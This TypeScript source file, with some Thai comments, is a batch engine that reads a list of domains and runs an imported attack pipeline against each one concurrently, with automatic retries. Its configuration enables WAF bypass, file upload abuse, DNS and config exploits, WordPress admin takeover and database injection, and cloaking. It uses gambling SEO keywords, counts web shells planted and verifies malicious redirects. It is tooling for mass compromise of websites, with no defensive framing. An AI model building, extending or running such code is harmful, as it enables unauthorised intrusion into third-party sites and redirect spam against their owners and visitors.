/**
 * Batch Attack Engine — โจมตีหลายโดเมนพร้อมกันจาก .txt file
 * 
 * Features:
 * - Parse domain list from .txt (one per line, skip comments/empty)
 * - Concurrency control (max 3 parallel attacks)
 * - Per-domain status tracking with timestamps
 * - Auto-retry failed domains (max 2 retries)
 * - Real-time progress reporting via callback
 * - Batch summary with success rate and timing
 */

import { runUnifiedAttackPipeline, type PipelineConfig, type PipelineResult } from "./unified-attack-pipeline";
import { pickRedirectUrl } from "./agentic-attack-engine";

// ─── Types ───

export type DomainStatus = "pending" | "running" | "success" | "failed" | "skipped" | "retrying";

export interface DomainResult {
  domain: string;
  status: DomainStatus;
  startedAt?: number;
  completedAt?: number;
  durationMs?: number;
  retryCount: number;
  redirectUrl?: string;
  verifiedRedirects: number;
  uploadedFiles: number;
  shellsGenerated: number;
  errors: string[];
  pipelineResult?: PipelineResult;
}

export interface BatchStatus {
  batchId: string;
  startedAt: number;
  completedAt?: number;
  totalDomains: number;
  pending: number;
  running: number;
  success: number;
  failed: number;
  skipped: number;
  cancelled: boolean;
  redirectUrl: string;
  domains: DomainResult[];
  progressPercent: number;
  estimatedTimeRemainingMs?: number;
}

export interface BatchConfig {
  maxConcurrent?: number;  // default 3
  maxRetries?: number;     // default 2
  redirectUrl?: string;    // auto-pick if not provided
  seoKeywords?: string[];
  globalTimeoutPerDomain?: number; // default 10 min
  onProgress?: (status: BatchStatus) => void | Promise<void>;
  onDomainComplete?: (domain: DomainResult, batchStatus: BatchStatus) => void | Promise<void>;
}

// ─── Domain Parser ───

export function parseDomainList(text: string): string[] {
  const lines = text.split(/\r?\n/);
  const domains: string[] = [];
  const seen = new Set<string>();
  
  for (const raw of lines) {
    const line = raw.trim();
    
    // Skip empty lines and comments
    if (!line || line.startsWith("#") || line.startsWith("//") || line.startsWith(";")) continue;
    
    // Extract domain from various formats
    let domain = line;
    
    // Handle full URLs: https://example.com/path → example.com
    try {
      if (domain.startsWith("http://") || domain.startsWith("https://")) {
        const url = new URL(domain);
        domain = url.hostname;
      }
    } catch {}
    
    // Remove protocol prefix if still present
    domain = domain.replace(/^https?:\/\//, "");
    
    // Remove trailing path/slash
    domain = domain.split("/")[0].split("?")[0].split("#")[0];
    
    // Remove port
    domain = domain.split(":")[0];
    
    // Remove www. prefix for dedup but keep original
    const normalized = domain.toLowerCase().replace(/^www\./, "");
    
    // Basic domain validation
    if (!normalized || !normalized.includes(".") || normalized.length < 4) continue;
    if (!/^[a-z0-9][a-z0-9.-]*[a-z0-9]\.[a-z]{2,}$/i.test(normalized)) continue;
    
    // Dedup
    if (seen.has(normalized)) continue;
    seen.add(normalized);
    
    domains.push(normalized);
  }
  
  return domains;
}

// ─── Active Batches Registry ───

const activeBatches = new Map<string, { status: BatchStatus; cancelFlag: boolean }>();

export function getActiveBatch(batchId: string): BatchStatus | null {
  const batch = activeBatches.get(batchId);
  return batch ? { ...batch.status } : null;
}

export function getAllActiveBatches(): BatchStatus[] {
  return Array.from(activeBatches.values()).map(b => ({ ...b.status }));
}

export function cancelBatch(batchId: string): boolean {
  const batch = activeBatches.get(batchId);
  if (!batch) return false;
  batch.cancelFlag = true;
  batch.status.cancelled = true;
  return true;
}

// ─── Batch Execution ───

function generateBatchId(): string {
  return `batch_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
}

function updateBatchCounts(status: BatchStatus): void {
  status.pending = status.domains.filter(d => d.status === "pending" || d.status === "retrying").length;
  status.running = status.domains.filter(d => d.status === "running").length;
  status.success = status.domains.filter(d => d.status === "success").length;
  status.failed = status.domains.filter(d => d.status === "failed").length;
  status.skipped = status.domains.filter(d => d.status === "skipped").length;
  
  const completed = status.success + status.failed + status.skipped;
  status.progressPercent = status.totalDomains > 0 
    ? Math.round((completed / status.totalDomains) * 100) 
    : 0;
  
  // Estimate remaining time
  if (completed > 0 && completed < status.totalDomains) {
    const elapsed = Date.now() - status.startedAt;
    const avgPerDomain = elapsed / completed;
    const remaining = status.totalDomains - completed;
    status.estimatedTimeRemainingMs = Math.round(avgPerDomain * remaining);
  }
}

async function attackDomain(
  domain: string,
  domainResult: DomainResult,
  redirectUrl: string,
  config: BatchConfig,
): Promise<void> {
  domainResult.status = "running";
  domainResult.startedAt = Date.now();
  domainResult.redirectUrl = redirectUrl;
  
  try {
    const pipelineConfig: PipelineConfig = {
      targetUrl: `https://${domain}`,
      redirectUrl,
      seoKeywords: config.seoKeywords || ["casino", "gambling", "slots"],
      enableCloaking: true,
      enableWafBypass: true,
      enableAltUpload: true,
      enableIndirectAttacks: true,
      enableDnsAttacks: true,
      enableConfigExploit: true,
      enableWpAdminTakeover: true,
      enableWpDbInjection: true,
      enableAiCommander: true,
      enableComprehensiveAttacks: true,
      enablePostUpload: true,
      userId: 1,
      globalTimeout: config.globalTimeoutPerDomain || 10 * 60 * 1000,
    };
    
    const result = await runUnifiedAttackPipeline(pipelineConfig);
    
    domainResult.pipelineResult = result;
    domainResult.shellsGenerated = result.shellsGenerated;
    domainResult.uploadedFiles = result.uploadedFiles.length;
    domainResult.verifiedRedirects = result.uploadedFiles.filter(
      f => f.redirectWorks && f.redirectDestinationMatch
    ).length;
    
    const anyRedirectWorks = result.uploadedFiles.some(f => f.redirectWorks);
    domainResult.status = (result.success || domainResult.verifiedRedirects > 0 || anyRedirectWorks) 
      ? "success" 
      : "failed";
    
    if (result.errors.length > 0) {
      domainResult.errors = result.errors.slice(0, 5);
    }
  } catch (err: any) {
    domainResult.status = "failed";
    domainResult.errors.push(err.message || "Unknown error");
  }
  
  domainResult.completedAt = Date.now();
  domainResult.durationMs = domainResult.completedAt - (domainResult.startedAt || domainResult.completedAt);
}

export async function runBatchAttack(
  domains: string[],
  config: BatchConfig = {},
): Promise<BatchStatus> {
  const batchId = generateBatchId();
  const maxConcurrent = config.maxConcurrent || 3;
  const maxRetries = config.maxRetries || 2;
  const redirectUrl = config.redirectUrl || await pickRedirectUrl();
  
  // Initialize batch status
  const domainResults: DomainResult[] = domains.map(domain => ({
    domain,
    status: "pending" as DomainStatus,
    retryCount: 0,
    verifiedRedirects: 0,
    uploadedFiles: 0,
    shellsGenerated: 0,
    errors: [],
  }));
  
  const batchStatus: BatchStatus = {
    batchId,
    startedAt: Date.now(),
    totalDomains: domains.length,
    pending: domains.length,
    running: 0,
    success: 0,
    failed: 0,
    skipped: 0,
    cancelled: false,
    redirectUrl,
    domains: domainResults,
    progressPercent: 0,
  };
  
  // Register active batch
  const batchEntry = { status: batchStatus, cancelFlag: false };
  activeBatches.set(batchId, batchEntry);
  
  // Notify start
  if (config.onProgress) {
    try { await config.onProgress(batchStatus); } catch {}
  }
  
  // Process domains with concurrency control
  const queue = [...domainResults];
  const running = new Set<Promise<void>>();
  
  async function processNext(): Promise<void> {
    while (queue.length > 0 || running.size > 0) {
      // Check cancellation
      if (batchEntry.cancelFlag) {
        // Mark remaining as skipped
        for (const dr of queue) {
          if (dr.status === "pending") dr.status = "skipped";
        }
        queue.length = 0;
        break;
      }
      
      // Fill up to maxConcurrent
      while (queue.length > 0 && running.size < maxConcurrent) {
        const domainResult = queue.shift()!;
        
        const task = (async () => {
          await attackDomain(domainResult.domain, domainResult, redirectUrl, config);
          
          // Auto-retry on failure
          if (domainResult.status === "failed" && domainResult.retryCount < maxRetries && !batchEntry.cancelFlag) {
            domainResult.retryCount++;
            domainResult.status = "retrying";
            domainResult.errors = []; // Clear errors for retry
            console.log(`[BatchAttack] Retrying ${domainResult.domain} (attempt ${domainResult.retryCount + 1}/${maxRetries + 1})`);
            await attackDomain(domainResult.domain, domainResult, redirectUrl, config);
          }
          
          // Update counts and notify
          updateBatchCounts(batchStatus);
          
          if (config.onDomainComplete) {
            try { await config.onDomainComplete(domainResult, batchStatus); } catch {}
          }
          if (config.onProgress) {
            try { await config.onProgress(batchStatus); } catch {}
          }
        })();
        
        running.add(task);
        task.finally(() => running.delete(task));
      }
      
      // Wait for at least one to finish
      if (running.size > 0) {
        await Promise.race(running);
      }
    }
  }
  
  await processNext();
  
  // Finalize
  batchStatus.completedAt = Date.now();
  updateBatchCounts(batchStatus);
  
  // Final progress callback
  if (config.onProgress) {
    try { await config.onProgress(batchStatus); } catch {}
  }
  
  // Clean up after 1 hour
  setTimeout(() => {
    activeBatches.delete(batchId);
  }, 60 * 60 * 1000);
  
  return batchStatus;
}

// ─── Batch Summary Formatter ───

export function formatBatchSummary(status: BatchStatus): string {
  const totalTime = status.completedAt 
    ? status.completedAt - status.startedAt 
    : Date.now() - status.startedAt;
  
  const mins = Math.floor(totalTime / 60000);
  const secs = Math.round((totalTime % 60000) / 1000);
  const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;
  
  const successRate = status.totalDomains > 0 
    ? Math.round((status.success / status.totalDomains) * 100) 
    : 0;
  
  let summary = `📊 Batch Attack Summary\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `Batch ID: ${status.batchId.substring(0, 20)}\n` +
    `Redirect: ${status.redirectUrl}\n` +
    `Total: ${status.totalDomains} domains\n\n` +
    `✅ Success: ${status.success}\n` +
    `❌ Failed: ${status.failed}\n` +
    `⏭ Skipped: ${status.skipped}\n` +
    `📈 Success Rate: ${successRate}%\n` +
    `⏱ Total Time: ${timeStr}\n`;
  
  if (status.cancelled) {
    summary += `\n⚠️ Batch was cancelled\n`;
  }
  
  // Top successful domains
  const successDomains = status.domains.filter(d => d.status === "success");
  if (successDomains.length > 0) {
    summary += `\n✅ Redirect สำเร็จ:\n`;
    for (const d of successDomains.slice(0, 10)) {
      const dur = d.durationMs ? `${Math.round(d.durationMs / 1000)}s` : "?";
      summary += `  ${d.domain} — ${d.verifiedRedirects} verified (${dur})\n`;
    }
    if (successDomains.length > 10) {
      summary += `  ... และอีก ${successDomains.length - 10} โดเมน\n`;
    }
  }
  
  // Top failed domains
  const failedDomains = status.domains.filter(d => d.status === "failed");
  if (failedDomains.length > 0) {
    summary += `\n❌ ล้มเหลว:\n`;
    for (const d of failedDomains.slice(0, 5)) {
      const err = d.errors[0] ? d.errors[0].substring(0, 50) : "unknown";
      summary += `  ${d.domain} — ${err}\n`;
    }
    if (failedDomains.length > 5) {
      summary += `  ... และอีก ${failedDomains.length - 5} โดเมน\n`;
    }
  }
  
  return summary;
}

export function formatDomainResult(dr: DomainResult): string {
  const dur = dr.durationMs ? `${Math.round(dr.durationMs / 1000)}s` : "?";
  const statusIcon = dr.status === "success" ? "✅" : dr.status === "failed" ? "❌" : "⏳";
  
  let msg = `${statusIcon} ${dr.domain}\n`;
  msg += `  Status: ${dr.status}`;
  if (dr.retryCount > 0) msg += ` (${dr.retryCount} retries)`;
  msg += `\n`;
  msg += `  Shells: ${dr.shellsGenerated} | Uploads: ${dr.uploadedFiles} | Verified: ${dr.verifiedRedirects}\n`;
  msg += `  Time: ${dur}\n`;
  
  if (dr.errors.length > 0 && dr.status === "failed") {
    msg += `  Error: ${dr.errors[0].substring(0, 60)}\n`;
  }
  
  return msg;
}
